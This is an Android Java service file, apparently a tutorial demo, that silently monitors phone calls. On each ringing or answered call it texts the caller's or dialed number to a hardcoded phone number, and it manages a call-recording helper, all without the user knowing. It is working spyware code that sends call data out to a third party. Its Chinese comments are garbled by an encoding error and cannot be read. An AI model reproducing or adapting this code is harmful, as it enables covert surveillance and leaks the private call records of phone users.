package org.lxh.demo;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

public class PhoneService extends Service {
	private TelephonyManager telephony = null;
	private String outgoingNumber = null;
	private RecordAudioUtil raUtil = null;
	private Intent intent = null ;

	@Override
	public void onCreate() { // ���񴴽���ʱ�����
		super.onCreate();
		this.telephony = (TelephonyManager) super
				.getSystemService(Context.TELEPHONY_SERVICE);
		this.telephony.listen(new PhoneStateListenerImpl(),
				PhoneStateListener.LISTEN_CALL_STATE); // ���ü�������
	}

	@Override
	public void onStart(Intent intent, int startId) {
		this.outgoingNumber = intent.getStringExtra("outgoingNumber");
		this.intent = intent ;
		super.onStart(intent, startId);
	}

	private class PhoneStateListenerImpl extends PhoneStateListener {

		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			switch (state) {
			case TelephonyManager.CALL_STATE_IDLE: // �Ҷϵ绰
				if (PhoneService.this.raUtil != null) { // ����
					PhoneService.this.raUtil.stop();
					PhoneService.this.raUtil = null;
				}
				break;
			case TelephonyManager.CALL_STATE_RINGING: // ��������
				new MessageSendUtil(PhoneService.this, PhoneService.this.intent)
						.send("13683527621", incomingNumber, "����");
				break;
			case TelephonyManager.CALL_STATE_OFFHOOK: // �����绰
				new MessageSendUtil(PhoneService.this, PhoneService.this.intent)
						.send("13683527621", PhoneService.this.outgoingNumber,
								"����");
				break;
			}
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

}
